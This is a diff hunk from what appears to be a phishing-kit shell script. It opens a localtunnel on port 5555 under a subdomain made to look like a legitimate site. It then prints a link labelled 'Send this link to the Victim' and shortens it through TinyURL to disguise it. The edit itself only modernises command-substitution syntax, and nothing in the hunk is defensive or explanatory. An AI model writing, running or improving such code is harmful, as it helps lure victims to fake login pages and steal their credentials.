@@ -539,7 +539,7 @@ sleep 8
 lt --port 5555 --subdomain wmw-$server-com &
 sleep 4
 printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $link
-short_link=`wget -q -O - http://tinyurl.com/api-create.php?url=https://wmw-$server-com.loca.lt`
+short_link=$(wget -q -O - http://tinyurl.com/api-create.php?url=https://wmw-$server-com.loca.lt)
 printf "\e[1;92m[\e[0m*\e[1;92m] Use shortened link instead:\e[0m\e[1;77m %s\e[0m\n" $short_link
 echo ""
 echo ""
